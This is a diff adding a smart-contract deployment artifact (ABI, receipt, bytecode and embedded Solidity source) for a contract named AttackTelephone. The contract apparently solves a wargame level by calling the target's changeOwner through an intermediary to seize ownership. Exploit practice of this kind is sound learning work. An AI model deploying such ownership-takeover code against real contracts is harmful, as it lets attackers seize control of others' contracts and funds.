@@ -1,0 +1,105 @@
+{
+  "address": "0xB8962e85872dFD9c137E218c7DE35175186d0Ca4",
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "contract ITelephone",
+          "name": "_telephone",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "changeOwner",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "telephone",
+      "outputs": [
+        {
+          "internalType": "contract ITelephone",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ],
+  "transactionHash": "0x13b36a336f8fc8d47cad84edbf43f44adf8fbce10222c255a147efad0c384244",
+  "receipt": {
+    "to": null,
+    "from": "0x482577148a64CF20f4a62F14A2455dC0A79478c7",
+    "contractAddress": "0xB8962e85872dFD9c137E218c7DE35175186d0Ca4",
+    "transactionIndex": 1,
+    "gasUsed": "133116",
+    "logsBloom": "0x00000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000800000000000000000000100000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000400000000000000000000000000200000000000000020000000000000000001000000000000000000000100004000000000000000000001000000000000000000000000000000100000000000000000000000000000000000000000000000000000002000000000000000100000",
+    "blockHash": "0x3f0305504ba46dee9945cfe274b5acc00be5627ddc61cbe59cec3af89007cda1",
+    "transactionHash": "0x13b36a336f8fc8d47cad84edbf43f44adf8fbce10222c255a147efad0c384244",
+    "logs": [
+      {
+        "transactionIndex": 1,
+        "blockNumber": 40930202,
+        "transactionHash": "0x13b36a336f8fc8d47cad84edbf43f44adf8fbce10222c255a147efad0c384244",
+        "address": "0x0000000000000000000000000000000000001010",
+        "topics": [
+          "0x4dfe1bbbcf077ddc3e01291eea2d5c70c2b422b415d95645b9adcfd678cb1d63",
+          "0x0000000000000000000000000000000000000000000000000000000000001010",
+          "0x000000000000000000000000482577148a64cf20f4a62f14a2455dc0a79478c7",
+          "0x000000000000000000000000c26880a0af2ea0c7e8130e6ec47af756465452e8"
+        ],
+        "data": "0x0000000000000000000000000000000000000000000000000001b3d88ad787f40000000000000000000000000000000000000000000000000ef410c43aa38275000000000000000000000000000000000000000000002219a581e7c64e789fbd0000000000000000000000000000000000000000000000000ef25cebafcbfa81000000000000000000000000000000000000000000002219a5839b9ed95027b1",
+        "logIndex": 3,
+        "blockHash": "0x3f0305504ba46dee9945cfe274b5acc00be5627ddc61cbe59cec3af89007cda1"
+      }
+    ],
+    "blockNumber": 40930202,
+    "cumulativeGasUsed": "284981",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [
+    "0xe38777C2b6DC75dD31b507CBa28d427a5D6C3C2d"
+  ],
+  "numDeployments": 1,
+  "solcInputHash": "1a1f601b5fa8e56d9694e67d0635eaa4",
+  "metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"contract ITelephone\",\"name\":\"_telephone\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"changeOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"telephone\",\"outputs\":[{\"internalType\":\"contract ITelephone\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Telephone/AttackTelephone.sol\":\"AttackTelephone\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Telephone/AttackTelephone.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ninterface ITelephone {\\n    function changeOwner(address _owner) external;\\n}\\n\\ncontract AttackTelephone {\\n\\n  ITelephone public telephone;\\n\\n  constructor(ITelephone _telephone) {\\n    telephone = _telephone;\\n  }\\n\\n  function changeOwner() public {\\n    telephone.changeOwner(msg.sender);\\n  }\\n}\",\"keccak256\":\"0xe99de8fb25b27906676eff7b29e6fd88e61c59b87b5894b46306726058734bd8\",\"license\":\"MIT\"}},\"version\":1}",
+  "bytecode": "0x608060405234801561001057600080fd5b5060405161019338038061019383398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b610100806100936000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c806362a0947714603757806393acaa5914603f575b600080fd5b603d606d565b005b6000546051906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b60005460405163a6f9dae160e01b81523360048201526001600160a01b039091169063a6f9dae190602401600060405180830381600087803b15801560b157600080fd5b505af115801560c4573d6000803e3d6000fd5b5050505056fea264697066735822122094fb2593af00809878c48d2de3aa929f076a57d7254a8a1f6a4d68696fdcbfc364736f6c63430008110033",
+  "deployedBytecode": "0x6080604052348015600f57600080fd5b506004361060325760003560e01c806362a0947714603757806393acaa5914603f575b600080fd5b603d606d565b005b6000546051906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b60005460405163a6f9dae160e01b81523360048201526001600160a01b039091169063a6f9dae190602401600060405180830381600087803b15801560b157600080fd5b505af115801560c4573d6000803e3d6000fd5b5050505056fea264697066735822122094fb2593af00809878c48d2de3aa929f076a57d7254a8a1f6a4d68696fdcbfc364736f6c63430008110033",
+  "devdoc": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {},
+    "version": 1
+  },
+  "storageLayout": {
+    "storage": [
+      {
+        "astId": 784,
+        "contract": "contracts/Telephone/AttackTelephone.sol:AttackTelephone",
+        "label": "telephone",
+        "offset": 0,
+        "slot": "0",
+        "type": "t_contract(ITelephone)781"
+      }
+    ],
+    "types": {
+      "t_contract(ITelephone)781": {
+        "encoding": "inplace",
+        "label": "contract ITelephone",
+        "numberOfBytes": "20"
+      }
+    }
+  }
+}
